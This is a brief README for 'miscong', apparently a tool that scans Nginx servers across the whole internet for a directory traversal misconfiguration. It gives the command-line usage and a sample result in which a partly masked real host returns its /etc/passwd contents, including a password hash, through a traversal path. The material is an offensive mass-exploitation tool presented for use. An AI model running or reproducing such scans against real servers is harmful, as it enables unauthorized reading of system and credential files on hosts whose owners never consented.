# miscong

Nginx misconfig directory traversal tool over entire internet

```
usage: app.py [-h] [-w WORKERS] [-t TIMEOUT] [-l LIMIT] [-d DEBUGLEVEL] list

positional arguments:
  list

optional arguments:
  -h, --help            show this help message and exit
  -w WORKERS, --workers WORKERS
  -t TIMEOUT, --timeout TIMEOUT
  -l LIMIT, --limit LIMIT
  -d DEBUGLEVEL, --debuglevel DEBUGLEVEL
```

# Samples

```
[+] 18x.xxx.xxx.59 /../../../../../../../../../../etc/passwd
  >>> b'root:absxcfbgXtb3o:0:0:root:/:/bin/sh'
```
